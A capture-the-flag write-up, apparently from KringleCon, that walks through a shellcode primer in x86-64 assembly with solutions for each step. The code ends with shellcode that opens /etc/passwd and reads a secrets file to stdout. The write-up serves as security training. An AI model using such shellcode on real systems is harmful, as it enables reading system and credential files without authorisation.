<h1 id="objective-6-shellcode-primer">Objective 6: Shellcode Primer</h1>
<p><strong>Location: Jack’s Office (Frost Tower, 16th floor), <a href="https://tracer.kringlecastle.com/">https://tracer.kringlecastle.com/</a></strong><br>
<strong>Elf: Ruby Cyster</strong></p>
<p>This objective is a small training in x86 assembly language (basics and performing system calls). The background is to be able to create shellcode payloads to be used in system attacks.</p>
<ol>
<li>Introduction</li>
<li>Loops</li>
<li>Getting Started</li>
</ol>
<pre><code>ret
</code></pre>
<ol start="4">
<li>Returning a Value</li>
</ol>
<pre><code>mov rax,1337  ; return value
ret
</code></pre>
<ol start="5">
<li>System Calls</li>
</ol>
<pre><code>mov rax,60    ; sys_exit
mov rdi,99    ; return code
syscall
</code></pre>
<ol start="6">
<li>Calling Into the Void</li>
<li>Getting RIP</li>
</ol>
<pre><code>call place_below_the_nop
nop
place_below_the_nop:
pop rax       ; pop pointer to NOP from stack
ret
</code></pre>
<ol start="8">
<li>Hello, World!</li>
</ol>
<pre><code>call go
db 'Hello World',0
go:
pop rax       ; pop pointer to string from stack
ret
</code></pre>
<ol start="9">
<li>Hello World!!</li>
</ol>
<pre><code>call go
db 'Hello World!',0
go:
mov rax,1     ; sys_write
mov rdi,1     ; file descriptor 1 (stdout)
pop rsi       ; pop pointer to buffer from stack
mov rdx,12    ; 12 bytes
syscall
ret
</code></pre>
<ol start="10">
<li>Opening a File</li>
</ol>
<pre><code>call go
db '/etc/passwd',0
go:
mov rax,2     ; sys_open
pop rdi       ; pop pointer to filename from stack
mov rsi,0     ; flags
mov rdx,0     ; mode
syscall
ret
</code></pre>
<ol start="11">
<li>Reading a File</li>
</ol>
<pre><code>call go
db '/var/northpolesecrets.txt',0
go:
mov rax,2     ; sys_open
pop rdi       ; pop pointer to filename from stack
mov rsi,0     ; flags
mov rdx,0     ; mode
syscall
mov rdi,rax   ; file descriptor returned from sys_open (in rax)
mov rax,0     ; sys_read
mov rsi,rsp   ; pointer to buffer on stack
mov rdx,1000; 1000 bytes to read
syscall
mov rdx,rax   ; number of bytes read returned by sys_read (in rax)
mov rax,1     ; sys_write
mov rdi,1     ; file descriptor 1 (stdout)
mov rsi,rsp   ; pointer to buffer on stack
syscall
mov rax,60    ; sys_exit
mov rdi,0     ; return code
syscall
</code></pre>
<p>The content of the file from step 11 is “Secret to KringleCon success: all of our speakers and organizers, providing the gift of <strong>cyber security knowledge</strong>, free to the community.”</p>

